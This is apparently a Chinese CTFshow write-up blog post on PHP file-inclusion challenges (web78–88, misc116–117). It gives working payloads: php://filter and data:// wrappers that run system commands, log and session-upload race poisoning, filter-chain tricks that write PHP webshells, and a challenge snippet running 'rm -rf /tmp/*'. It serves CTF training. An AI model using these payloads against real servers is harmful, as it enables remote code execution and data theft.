<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CTFshow刷题日记-WEB-文件包含 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="CTFshow刷题日记-WEB-文件包含" />
<meta property="og:description" content="文件包含专题
web78 if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; include($file); }else{ highlight_file(__FILE__); } 依旧是代码审计类型
直接伪协议
?file=php://filter/convert.base64-encode/resource=flag.php ?file=data://text/plain,&lt;?php system(&#34;nl flag.php&#34;);?&gt; 使用data协议和php://filter协议的各种格式 web79 加了过滤
$file = str_replace(&#34;php&#34;, &#34;???&#34;, $file); payload
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbGFnLnBocCIpOyA/Pg== base64中不要出现&#43;，因为url编码中这是空格 web80 把data给过滤了
if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; $file = str_replace(&#34;php&#34;, &#34;???&#34;, $file); $file = str_replace(&#34;data&#34;, &#34;???&#34;, $file); include($file); }&#43;654 ,N 包含日志文件 进行getshell 日志文件路径： ?file=/var/log/nginx/access.log
ctrl &#43; u查看源码
不行的话多尝试几次
web81 和80题一样
这次用burp做
cat flag
再不同的界面多尝试几次
web82-86 利用session对话进行文件包含利用参考链接
#poc.php &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;form action=&#34;ip地址&#34; method=&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/9db798043e561e4b739fd6b7b67226a1/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-09-04T17:10:01+08:00" />
<meta property="article:modified_time" content="2021-09-04T17:10:01+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CTFshow刷题日记-WEB-文件包含</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>文件包含专题</p> 
<h4><a id="web78_2"></a>web78</h4> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>依旧是代码审计类型</p> 
<p>直接伪协议</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=flag.php</span>
<span class="token operator">?</span>file<span class="token operator">=</span><span class="token argument-name">data</span><span class="token punctuation">:</span><span class="token comment">//text/plain,&lt;?php system("nl flag.php");?&gt;</span>
使用data协议和<span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter协议的各种格式</span>
</code></pre> 
<h4><a id="web79_23"></a>web79</h4> 
<p>加了过滤</p> 
<pre><code class="prism language-php">    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>payload</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token argument-name">data</span><span class="token punctuation">:</span><span class="token comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbGFnLnBocCIpOyA/Pg==</span>
base64中不要出现<span class="token operator">+</span>，因为url编码中这是空格
</code></pre> 
<h4><a id="web80_38"></a>web80</h4> 
<p>把data给过滤了</p> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token operator">+</span><span class="token number">654</span>
    <span class="token punctuation">,</span><span class="token constant">N</span> 
</code></pre> 
<p>包含日志文件 进行getshell 日志文件路径： ?file=/var/log/nginx/access.log</p> 
<p><img src="https://images2.imgbox.com/a3/4f/ZlkAdgAI_o.png" alt="image-20210904131053826"></p> 
<p><img src="https://images2.imgbox.com/23/a9/NwshyeLB_o.png" alt="image-20210904131211888"></p> 
<p>ctrl + u查看源码</p> 
<p><img src="https://images2.imgbox.com/a2/89/dRK5gmME_o.png" alt="image-20210904131214662"></p> 
<p>不行的话多尝试几次</p> 
<h4><a id="web81_64"></a>web81</h4> 
<p>和80题一样</p> 
<p>这次用burp做</p> 
<p><img src="https://images2.imgbox.com/b8/0b/9AQjZ9Os_o.png" alt="image-20210904131500267"></p> 
<p>cat flag</p> 
<p><img src="https://images2.imgbox.com/5f/b7/m6hMOcn0_o.png" alt="image-20210904131547964"></p> 
<p>再不同的界面多尝试几次</p> 
<h4><a id="web8286_78"></a>web82-86</h4> 
<p>利用session对话进行文件包含利用<a href="https://www.freebuf.com/vuls/202819.html" rel="nofollow">参考链接</a></p> 
<pre><code class="prism language-html">#poc.php
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ip地址<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2333<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>利用竞争，在session文件内容清空前进行包含利用</p> 
<p><img src="https://images2.imgbox.com/15/17/sRIDVOQC_o.png" alt="image-20210904140012902"></p> 
<blockquote> 
 <p>如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p> 
 <p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p> 
</blockquote> 
<p>第二个方法是通过php的小truck<br> 在这里有个小知识点，/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过,直接构造payload</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span>

<span class="token operator">?</span>file<span class="token operator">=</span><span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=/nice/../../proc/self/cwd/flag.php</span>
</code></pre> 
<h4><a id="web83_113"></a>web83</h4> 
<p><img src="https://images2.imgbox.com/28/3e/B8tfmCtO_o.png" alt="image-20210904140921570"></p> 
<pre><code class="prism language-php"><span class="token comment">#poc.php</span>
<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string double-quoted-string">"http://a69268f1-514c-469c-b072-c647c5a7c278.challenge.ctf.show:8080?file=/temp/sess_flag"</span> method<span class="token operator">=</span><span class="token string double-quoted-string">"POST"</span> enctype<span class="token operator">=</span><span class="token string double-quoted-string">"multipart/form-data"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"hidden"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"PHP_SESSION_UPLOAD_PROGRESS"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"2333"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<h4><a id="web84_134"></a>web84</h4> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rm -rf /tmp/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>本来就是条件竞争，没有影响</p> 
<h4><a id="web87_150"></a>web87</h4> 
<p>死亡die</p> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die('大佬别秀了');?&gt;"</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</p> 
<p>看完这篇文章大概就懂了</p> 
<p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p> 
<p>当<code>$content</code>被加上了<code>&lt;?php die('大佬别秀了');?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符</p> 
<p>base64算法解码时是4个byte一组，所以给他增加2个“a”一共8个字符</p> 
<p>"phpdieaa"被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php die('大佬别秀了');?&gt;</code>没有了。</p> 
<pre><code class="prism language-php">file<span class="token operator">=</span><span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter/write=convert.base64-decode/resource=shell.php</span>
对文件名进行url解码后再用file_put_contents写入，通过把p换成<span class="token operator">%</span><span class="token number">2570</span>（<span class="token operator">%</span><span class="token number">2570</span>→<span class="token operator">%</span><span class="token number">70</span>→p）绕过对php的过滤
file<span class="token operator">=</span><span class="token operator">%</span><span class="token number">2570</span>hp<span class="token operator">%</span><span class="token number">253</span>A<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Ffilter<span class="token operator">%</span><span class="token number">2</span>Fwrite<span class="token operator">%</span><span class="token number">3</span>Dconvert<span class="token operator">%</span><span class="token number">252</span>Ebase64<span class="token operator">-</span>decode<span class="token operator">%</span><span class="token number">2</span>Fresource<span class="token operator">%</span><span class="token number">3</span>Dshell<span class="token operator">%</span><span class="token number">252</span>E<span class="token operator">%</span><span class="token number">2570</span>hp

<span class="token argument-name">post</span><span class="token punctuation">:</span>
content<span class="token operator">=</span><span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
content<span class="token operator">=</span>aaPD9waHAgc3lzdGVtKCRfR0VUWzFdKTs<span class="token operator">/</span>Pg<span class="token operator">==</span>    
</code></pre> 
<p>shell.php写入成功</p> 
<p><img src="https://images2.imgbox.com/ff/45/QvS63F6G_o.png" alt="image-20210904145340098"></p> 
<p><img src="https://images2.imgbox.com/ee/bd/nM1fhqUo_o.png" alt="image-20210904145417658"></p> 
<p>查看源码，拿到flag</p> 
<h4><a id="web88_199"></a>web88</h4> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>发现data伪协议没有被过滤，过滤了加号和等号，所以要注意base64字符串不能有</p> 
<p><img src="https://images2.imgbox.com/8c/e6/goLaSg2z_o.png" alt="image-20210904162121003"></p> 
<p>直接用蚁剑连就行</p> 
<p><img src="https://images2.imgbox.com/dd/84/2angnMjm_o.png" alt="image-20210904162535248"></p> 
<p>拿到flag</p> 
<p><img src="https://images2.imgbox.com/45/2c/X2ZTfejI_o.png" alt="image-20210904162547792"></p> 
<p>或者</p> 
<p>使用</p> 
<p><img src="https://images2.imgbox.com/bb/1c/Og5toBTt_o.png" alt="image-20210904162925845"></p> 
<p>把等号去掉</p> 
<p><img src="https://images2.imgbox.com/46/c5/VZH8k3DZ_o.png" alt="image-20210904163022286"></p> 
<p>payload</p> 
<pre><code class="prism language-url">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4
</code></pre> 
<p>查看源码拿到flag</p> 
<h4><a id="misc116_241"></a>misc116</h4> 
<p>提示：misc+lfi</p> 
<p>上来是一个视频，下载，再kali中使用formost命令拆分文件，发现png文件就是源码</p> 
<p><img src="https://images2.imgbox.com/7e/0a/W7YKeb91_o.png" alt="00080067"></p> 
<p>再浏览器访问?file=flag.php发现啥也点不了</p> 
<p><img src="https://images2.imgbox.com/fe/cd/frsf1hqF_o.png" alt="image-20210904165305872"></p> 
<p>还是用bp</p> 
<p><img src="https://images2.imgbox.com/c6/d8/V4i73eQy_o.png" alt="image-20210904165313615"></p> 
<p>拿到flag</p> 
<h4><a id="misc117_259"></a>misc117</h4> 
<pre><code class="prism language-php"><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contents'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die();?&gt;"</span><span class="token operator">.</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>死亡die</p> 
<p>过滤了base64和rot13，但是可以用其他的编码方式来绕过</p> 
<p>PHP支持的编码方式：<a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php" rel="nofollow">链接</a></p> 
<p>UCS-2LE UCS-2BE编码</p> 
<pre><code class="prism language-php"><span class="token argument-name">payload</span><span class="token punctuation">:</span>
file<span class="token operator">=</span><span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span>
<span class="token argument-name">post</span><span class="token punctuation">:</span>contents<span class="token operator">=</span><span class="token operator">?</span><span class="token operator">&lt;</span>hp <span class="token class-name type-declaration">pvela</span>$<span class="token punctuation">(</span><span class="token constant">P_SO</span><span class="token punctuation">[</span><span class="token constant">T</span><span class="token punctuation">]</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">?</span>
</code></pre> 
<p>直接点吧，用蚁剑链接看flag</p> 
<p><img src="https://images2.imgbox.com/42/02/fdG9hBYg_o.png" alt="image-20210904170443705"></p> 
<h4><a id="_291"></a>参考链接</h4> 
<p><a href="https://blog.csdn.net/miuzzx/article/details/116205407">https://blog.csdn.net/miuzzx/article/details/116205407</a></p> 
<p><a href="https://eastjun.top/2021/04/15/ctfshow%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab/" rel="nofollow">https://eastjun.top/2021/04/15/ctfshow文件包含/</a></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/4bd5a8b788f2e9e58294f9371a3cf365/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">currentIndex</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/f9e4cda214388c4e54f670d8d446bf22/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Vue 使用 video 标签实现视频播放</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>